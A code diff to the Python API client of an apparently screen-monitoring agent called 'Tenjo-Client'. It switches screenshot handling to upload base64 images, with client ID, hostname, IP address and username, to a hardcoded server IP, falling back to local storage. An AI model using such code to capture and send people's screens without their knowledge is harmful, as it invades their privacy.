@@ -383,20 +383,54 @@ class APIClient:
         is_production = '103.129.149.67' in self.server_url
         
         if is_production:
-            # Production server - store screenshot data in pending for future upload
-            # For now, we simulate success and store locally
+            # Production server - upload directly to API
             try:
-                # Store screenshot data locally with metadata
-                self._store_screenshot_locally(image_data, metadata)
-                logging.info("Screenshot stored locally - production upload pending")
-                return {
-                    'success': True, 
-                    'message': 'Screenshot captured and stored locally (production mode)',
-                    'stored_locally': True
+                # Prepare data for production API
+                upload_data = {
+                    'client_id': metadata.get('client_id'),
+                    'image_data': image_data,  # Base64 encoded
+                    'resolution': metadata.get('resolution'),
+                    'monitor': metadata.get('monitor', 1),
+                    'timestamp': metadata.get('timestamp')
                 }
+                
+                # Use production headers
+                headers = {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Tenjo-Client/1.0'
+                }
+                
+                logging.info("Uploading screenshot to production server...")
+                result = self._make_request_with_headers('POST', '/api/screenshots', upload_data, headers)
+                
+                if result and result.get('success'):
+                    logging.info("Screenshot uploaded to production successfully")
+                    return result
+                else:
+                    # Fallback to local storage if production upload fails
+                    logging.warning("Production upload failed, storing locally")
+                    self._store_screenshot_locally(image_data, metadata)
+                    return {
+                        'success': True,
+                        'message': 'Screenshot stored locally (production upload failed)',
+                        'stored_locally': True
+                    }
+                    
             except Exception as e:
-                logging.error(f"Failed to store screenshot locally: {e}")
-                return {'success': False, 'message': f'Failed to store screenshot: {str(e)}'}
+                logging.error(f"Production screenshot upload failed: {e}")
+                # Fallback to local storage
+                try:
+                    self._store_screenshot_locally(image_data, metadata)
+                    return {
+                        'success': True,
+                        'message': f'Screenshot stored locally (production error: {str(e)})',
+                        'stored_locally': True
+                    }
+                except Exception as local_error:
+                    logging.error(f"Local storage also failed: {local_error}")
+                    return {'success': False, 'message': f'Failed to store screenshot: {str(e)}'}
         else:
             # Local development API
             try:
@@ -493,7 +527,8 @@ class APIClient:
                 'client_id': client_info.get('client_id'),
                 'hostname': client_info.get('hostname'),
                 'ip_address': client_info.get('ip_address'),
-                'username': client_info.get('username', client_info.get('user')),  # Use username field
+                'username': client_info.get('username', client_info.get('user', 'unknown')),
+                'user': client_info.get('username', client_info.get('user', 'unknown')),  # Send both fields
                 'timezone': client_info.get('timezone')
             }
             
@@ -525,20 +560,23 @@ class APIClient:
             headers = {
                 'Content-Type': 'application/json',
                 'Accept': 'application/json',
-                'X-Requested-With': 'XMLHttpRequest'
+                'X-Requested-With': 'XMLHttpRequest',
+                'User-Agent': 'Tenjo-Client/1.0'
             }
             
             try:
+                logging.info(f"Registering client with production server: {self.server_url}")
+                logging.debug(f"Registration data: {production_data}")
                 return self._make_request_with_headers('POST', '/api/clients/register', production_data, headers)
             except Exception as e:
-                print(f"Production registration failed: {e}")
+                logging.error(f"Production registration failed: {e}")
                 raise
         else:
             # Local development server
             try:
                 return self._make_request('POST', '/api/clients/register', client_info)
             except Exception as e:
-                print(f"Registration failed: {e}")
+                logging.error(f"Registration failed: {e}")
                 raise
         
     def send_process_data(self, process_data):
